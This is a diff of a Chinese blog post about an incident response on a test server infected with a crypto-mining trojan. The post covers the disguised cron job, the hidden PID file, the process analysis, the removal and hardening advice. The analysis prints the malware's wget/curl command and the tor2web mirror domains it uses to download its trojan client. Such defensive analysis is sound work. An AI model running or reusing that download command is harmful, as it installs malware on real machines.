@@ -18,7 +18,7 @@ categories:
 我想事情可能没那么简单，可能设置了定时任务或者有其他远控尚未发现。通过排查定时任务使用`crontab -l`，发现有一条定时任务，仔细一看原来是阿里云的shell脚本，但是整个系统就配置了这一条定时任务，难免让人怀疑。
 ![20191219-trojan-03.png](https://hksanduo.github.io/images/20191219-trojan-03.png)
 当我打开`/root/.aliyun.sh`，我突然发现自己还是太年轻，攻击者尽然使用的是障眼法，没有那个运维人员会闲的蛋疼，把shell程序的内容使用base64进行编码。
-![20191219-trojan-04.png](https://hksanduo.github.io/images/20191219-trojan-04.png)
+![20191219-trojan-04.png](https://hksanduo.github.io/images/20191219-trojan-04.png)   
 以下是相关代码，有想研究的小伙伴可以拿去进行研究。
 ```
 #!/bin/bash
@@ -75,11 +75,10 @@ fi
 通过分析，我们可以发现，该shell首先会判断当前用户是否对`/usr/bin 当前用户的home目录 /dev/shm /tmp /var/tmp`这几个目录拥有读写权限。
 
 > **/tmp/.X11-unix/00是什么鬼**
-X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上它们可以通过TCP/IP Socket来实现沟通，而在本机上它们通过一个Unix-domain socket来沟通.Unix-domain socket其实很TCP/IP socket很类似，只不过它指向的是一个文件路径，而且无需通过网卡进行转发，因此相对来说更安全，更更快些。而 /tmp/.X11-unix 其实就是存放这些Unix-domain Socket的地方。一般来说 /tmp/.X11-unix 下面只会有一个 Unix-domain Socket(因为一般只有一个Xserver在运行)，但若系统同时运行多个Xserver，也可能会有多个Unix Domain Socket出现的情况。具体可以参考参考内容里的文章，里面有详细说明
+> X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上它们可以通过TCP/IP Socket来实现沟通，而在本机上它们通过一个Unix-domain socket来沟通.Unix-domain socket其实很TCP/IP socket很类似，只不过它指向的是一个文件路径，而且无需通过网卡进行转发，因此相对来说更安全，更更快些。而 /tmp/.X11-unix 其实就是存放这些Unix-domain Socket的地方。一般来说 /tmp/.X11-unix 下面只会有一个 Unix-domain Socket(因为一般只有一个Xserver在运行)，但若系统同时运行多个Xserver，也可能会有多个Unix Domain Socket出现的情况。具体可以参考参考内容里的文章，里面有详细说明
 
 但是，通过查看`/tmp/.X11-unix/`目录中的**00**文件，我并未发现该文件的种类并不是**s**，攻击者可能是为了掩人耳目，故意在该目录下设置一个文件，来存储远控木马进程id
 ![20191219-trojan-06.png](https://hksanduo.github.io/images/20191219-trojan-06.png)
-
 通过判断 **/proc/木马进程id/io** 文件是否存在，如果不存在执行**X**函数从以下这些站点三级域名**trumps4c4ohxvq7o**下载int木马客户端
 * tor2web.io
 * 4tor.ml
@@ -99,22 +98,18 @@ X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上�
 wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee4ac14e82501dc127890f75770c17   || curl -m10 -fsSLkA- trumps4c4ohxvq7o.onion.mn/int -o./e0ee4ac14e82501dc127890f75770c17
 ```
 然后继续通过判断 **/proc/木马进程id/io** 文件是否存在，如果不存在执行**U**函数从以下这些站点三级域名**trumps4c4ohxvq7o**下载**crn** shell脚本并执行，
-
 使用`lsof`命令查看该进程相关信息，如果没有相关命令，请自行安装
 ![20191219-trojan-07.png](https://hksanduo.github.io/images/20191219-trojan-07.png)
 可以发现相应的远控客户端（/usr/bin/46e5166a46208402e09732a78526b5f0）已删除
 使用top我们可以发现，该挖矿木马的客户端的进程id为8391，
 ![20191219-trojan-08.png](https://hksanduo.github.io/images/20191219-trojan-08.png)
-
 通过查看`/tmp/.X11-unix/00`文件，获取对应远控客户端进程id为**8065**
 ![20191219-trojan-09.png](https://hksanduo.github.io/images/20191219-trojan-09.png)
 通过pstree，我们可以清晰的看到两个异常的进程**OYK6yV**和 **jKhnvF**
 ![20191219-trojan-10.png](https://hksanduo.github.io/images/20191219-trojan-10.png)
 通过分析`ps -ef`的结果，获取异常异常进程信息
 ![20191219-trojan-11.png](https://hksanduo.github.io/images/20191219-trojan-11.png)
-
 综合所有信息，我们发现jKhnvF是挖矿进程，OYK6yV是木马远控的进程。
-
 ## 移除挖矿木马
 分析完挖矿木马基本信息，接下来我们需要移除这些恶意的进程，并针对相关漏洞进行打补丁。
 我们首先移除了crotab中设定的定时任务
@@ -125,11 +120,9 @@ wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee
 ![20191219-trojan-14.png](https://hksanduo.github.io/images/20191219-trojan-14.png)
 我们通过移除两个定时任务，然后重复上面的操作，找到挖矿端和木马远控客户端，杀掉就行
 ![20191219-trojan-15.png](https://hksanduo.github.io/images/20191219-trojan-15.png)
-
 看着运行正常的系统，内心还是很满足的。
 ![20191219-trojan-16.png](https://hksanduo.github.io/images/20191219-trojan-16.png)
-
-后续溯源工作由于系统是研发同事的测试系统，上面运行三个web站点，并且安装redis，memcache等，并且未设置日志，所以并未发现攻击者是从什么地方进来的。针对这些问题我们给出以下建议：
+后续溯源工作由于系统是研发同事的测试系统，上面运行三个web站点，并且安装redis，memcache等，并且未设置日志，所以并未发现攻击者是从什么地方进来的。针对这些问题我们给出以下建议:
 1、配置redis的日志，对redis进行安全加固和合规性配置
 2、使用河马webshell查杀工具对web目录进行扫描，查看是否有遗留的webshell
 3、加固操作系统，重新设置复杂度较高的密码。
